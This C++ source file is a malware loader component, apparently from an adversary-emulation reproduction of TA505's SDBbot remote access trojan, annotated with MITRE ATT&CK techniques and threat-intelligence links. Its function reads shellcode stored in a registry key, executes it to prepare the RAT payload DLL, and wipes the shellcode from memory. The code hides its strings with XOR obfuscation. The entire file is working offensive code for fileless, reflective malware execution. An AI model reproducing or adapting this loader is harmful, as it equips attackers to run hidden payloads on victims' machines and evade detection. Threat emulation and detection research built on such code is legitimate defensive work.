#include "loader.hpp"

/*
 * loader_main:
 *      About:
 *          Reads and executes the shellcode blob from the registry, which will return information about
 * 			the RAT payload DLL, such as the exported function that will be called in a later hook.
 *          Relevant API calls:
 *              RegGetValueW, VirtualFree
 *      Result:
 *          Executed shellcode
 *      MITRE ATT&CK Techniques:
 *          T1620: Reflective Code Loading
 * 			T1055.001: Process Injection: Dynamic-link Library Injection
 *      CTI:
 *          https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
 * 			https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
 */
std::expected<LSTATUS, const wchar_t*>
loader_main() {

	common::log_info(XOR_WIDE_LIT(L"Reading shellcode from registry."));

	// read the shellcode data from the registry into the byte array in the custom section
	auto bytes = common::early_read_registry_binary(
		HKEY_LOCAL_MACHINE,
		XOR_WIDE_LIT(LR"()" SHELLCODE_KEY LOADER_SHELLCODE_KEY),
		L"" LOADER_SHELLCODE_VALUE
	);
	if (!bytes) {
		common::log_error(bytes.error());
		return std::unexpected(bytes.error());
	}

	common::log_success(XOR_WIDE_LIT(L"Retrieved shellcode from registry. Executing."));

	// run the shellcode
	auto shellcode = reinterpret_cast<shellcode_t>(bytes.value().data() + SHELLCODE_PREFIX_SIZE);
	g_shellcode_result = shellcode();
	common::log_success(XOR_WIDE_LIT(L"Shellcode has completed executing."));

	// Wipe the shellcode
	std::fill_n(
		reinterpret_cast<unsigned char*>(bytes.value().data()),
		bytes.value().size_bytes(),
		0
	);
	
	VirtualFree(bytes.value().data(), 0, MEM_RELEASE);

	return ERROR_SUCCESS;
}